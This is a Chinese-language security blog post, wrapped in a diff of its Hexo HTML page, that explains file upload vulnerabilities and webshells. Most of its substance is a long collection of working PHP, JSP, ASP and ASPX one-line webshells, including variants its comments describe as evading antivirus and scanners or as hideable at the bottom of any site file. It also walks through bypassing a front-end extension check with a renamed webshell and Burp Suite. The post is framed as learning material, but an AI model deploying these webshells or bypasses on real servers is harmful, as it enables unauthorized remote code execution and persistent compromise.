@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="什么是文件上传漏洞？由于程序员没有对文件上传后做审查导致用户可以按照自己的想法上传可执行文件，这个就是文件上传漏洞。 什么是Webshell 就是一种以asp[^asp]，php，jsp，cgi等网页文件形式存在的一种命令执行环境   什么是一句话木马可以理解为连接菜刀，蚁剑的钥匙 下面是常用的一句话木马 123&lt;?php    eval($_POST(cmd));?&gt;  这个cmd就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="https://tsy244.github.io/2023/11/19/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="chg">
+<meta property="og:description" content="什么是文件上传漏洞？由于程序员没有对文件上传后做审查导致用户可以按照自己的想法上传可执行文件，这个就是文件上传漏洞。 什么是Webshell 就是一种以asp[^asp]，php，jsp，cgi等网页文件形式存在的一种命令执行环境   什么是一句话木马可以理解为连接菜刀，蚁剑的钥匙 下面是常用的一句话木马 123&lt;?php    eval($_POST(cmd));?&gt;  这个cmd就">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-19T08:58:36.000Z">
+<meta property="article:modified_time" content="2023-11-19T13:07:24.156Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="基础漏洞学习">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>文件上传 - chg</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>chg&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件上传"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-19 16:58" pubdate>
+          November 19, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件上传</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h1><p>由于程序员没有对文件上传后做审查导致用户可以按照自己的想法上传可执行文件，这个就是文件上传漏洞。</p>
+<h1 id="什么是Webshell"><a href="#什么是Webshell" class="headerlink" title="什么是Webshell"></a>什么是Webshell</h1><ol>
+<li>就是一种以asp[^asp]，php，jsp，cgi等网页文件形式存在的一种命令执行环境</li>
+<li></li>
+</ol>
+<h1 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h1><p>可以理解为连接菜刀，蚁剑的钥匙</p>
+<p>下面是常用的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>(cmd));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个cmd就是我们需要的钥匙</p>
+<h2 id="常用的一句话木马"><a href="#常用的一句话木马" class="headerlink" title="常用的一句话木马"></a>常用的一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">##PHP：</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;r00ts&#x27;</span>]);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;); ?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?cmd=phpinfo();</span><br><span class="hljs-variable">$func</span> =<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$func</span>();<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//?func=system&amp;cmd=whoami</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-comment">//print_r($new_array);</span><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?cmd=phpinfo()</span><br>@<span class="hljs-title function_ invoke__">call_user_func</span>(assert,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?cmd=phpinfo()</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?func=system&amp;cmd=whoami</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array1</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$func</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$array1</span>,<span class="hljs-variable">$func</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$_GET</span>,<span class="hljs-string">&#x27;asse&#x27;</span>.<span class="hljs-string">&#x27;rt&#x27;</span>);<span class="hljs-meta">?&gt;</span> php环境&gt;=&lt;<span class="hljs-number">5.6</span>才能用<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(...<span class="hljs-variable">$_GET</span>);<span class="hljs-meta">?&gt;</span>  php环境&gt;=<span class="hljs-number">5.6</span>才能用<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST1</span>);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);&#125;<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_REQUEST1</span>);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> (<span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET1</span>).@<span class="hljs-variable">$_</span>(<span class="hljs-variable">$_POST1</span>)<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST1</span>)<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST1</span>)<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//容错代码 </span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST1</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </span><br><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cc&#x27;</span>]);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cc&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cc&#x27;</span>])<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[email]/e&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>],<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/</span>:&lt;O&gt;h=@<span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST1</span>);&lt;/O&gt; <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]` <span class="hljs-meta">?&gt;</span> <br><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST</span>[sb])&lt;/script&gt; <span class="hljs-comment">//绕过&lt;?限制的一句话</span><br><br><span class="hljs-meta">&lt;?php</span> (])<span class="hljs-meta">?&gt;</span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！<br><br><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]))&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span> <br>加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！<br><br>&lt;%execute <span class="hljs-title function_ invoke__">request</span>(“<span class="hljs-keyword">class</span>”)%&gt;&lt;%<span class="hljs-string">&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;</span>&lt;% loop &lt;%:%&gt;&lt;%execute <span class="hljs-title function_ invoke__">request</span> (“<span class="hljs-keyword">class</span>”)%&gt;&lt;%execute <span class="hljs-title function_ invoke__">request</span>(“<span class="hljs-keyword">class</span>”)<span class="hljs-string">&#x27;&lt;% loop &lt;%:%&gt; </span><br><span class="hljs-string">无防下载表，有防下载表可尝试插入以下语句突破的一句话 </span><br><span class="hljs-string">&lt;%eval(request(“1″)):response.end%&gt; 备份专用</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">##JSP：<br>&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-literal">null</span>)(newjava.io.FileOutputStream (application.getRealPath(<span class="hljs-string">&quot;\\&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write (request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt; <br>提交客户端 <br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;textareaname=<span class="hljs-string">&quot;t&quot;</span>&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=<span class="hljs-string">&quot;submit&quot;</span>value=<span class="hljs-string">&quot;提交&quot;</span>&gt;&lt;/form&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asp">##ASP<br>&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;<br><br>&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; <br><br>&lt;%execute(request(“1″))%&gt; <br><br>&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#x27;&lt;,&gt;‘的asp一句话 <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs aspx">##aspx<br>&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; <br><br>&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; <br><br>&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="文件上传漏洞的原因"><a href="#文件上传漏洞的原因" class="headerlink" title="文件上传漏洞的原因"></a>文件上传漏洞的原因</h1><ol>
+<li>文件扩展名或者后缀名没有做好严格的限制</li>
+<li>文件上传的表述方法没有做好检查</li>
+<li>没有对文件设置不可执行权限（特别是shebang<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="就是符号`#!`这个一般存在于shell脚本的第一行">[1]</span></a></sup>）</li>
+<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
+</ol>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol>
+<li><p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
+</li>
+<li><p>文件上传后导致的常见安全问题一般有:</p>
+<ul>
+<li><p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>码执行;</p>
+</li>
+<li><p>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</p>
+</li>
+<li><p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p>
+</li>
+<li><p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</p>
+</li>
+</ul>
+<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。此类问题不在此细述。</p>
+</li>
+</ol>
+<h1 id="文件上传漏洞的攻击和防御方法"><a href="#文件上传漏洞的攻击和防御方法" class="headerlink" title="文件上传漏洞的攻击和防御方法"></a>文件上传漏洞的攻击和防御方法</h1><h2 id="前端限制"><a href="#前端限制" class="headerlink" title="前端限制"></a>前端限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    &lt;h3&gt;代码&lt;/h3&gt;<br>&lt;pre&gt;<br>&lt;code <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">line</span>-<span class="hljs-title">numbers</span> <span class="hljs-title">language</span>-<span class="hljs-title">javascript</span>&quot;&gt;<span class="hljs-title">function</span> <span class="hljs-title">checkFile</span>() </span>&#123;<br>    <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].value;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));  <span class="hljs-comment">//substring(index) 开始截取的下标</span><br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_ invoke__">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br>&lt;/code&gt;<br>&lt;/pre&gt;<br>&lt;/li&gt;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>通过调用js在前端检查是否是允许上传的文件，并不会推送到服务器</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>这种限制很简单，通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p>
+<h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p>准备好一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>并且修改后缀名为jpg，上传操作，通过burpsuit抓包改包，使其后缀名修改回php。</p>
+<p>注意这个先后关系，前端检测完了发现可以通过后会将数据发送到服务器，我们使用bs抓包，抓到的是前端检查过后的数据</p>
